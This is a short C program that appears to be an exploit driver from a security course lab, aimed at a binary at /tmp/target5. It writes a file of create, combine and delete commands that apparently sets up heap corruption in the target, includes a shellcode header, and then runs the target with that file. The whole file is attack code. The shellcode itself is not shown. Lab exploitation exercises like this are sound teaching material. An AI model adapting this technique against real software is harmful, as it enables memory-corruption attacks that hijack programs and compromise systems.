#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"
#include <fcntl.h>

#define TARGET "/tmp/target5"

int main(void)
{
	int fd;
	char arg1[] = "sploit5-cmds";
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	
	fd = open(arg1, O_CREAT | O_RDWR, 0666);
	write(fd, "create 0 AAAAA\n", 15);
	write(fd, "create 1 BBBBBB\n", 16);
	write(fd, "create 2 CCCCCCCCCCCCCCCCCC\n", 28);
	write(fd, "combine 2 1 1\n", 14);
	write(fd, "create 0 AAAAAAAAAAAAAA\n", 24);
	write(fd, "delete 1\n", 9);

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
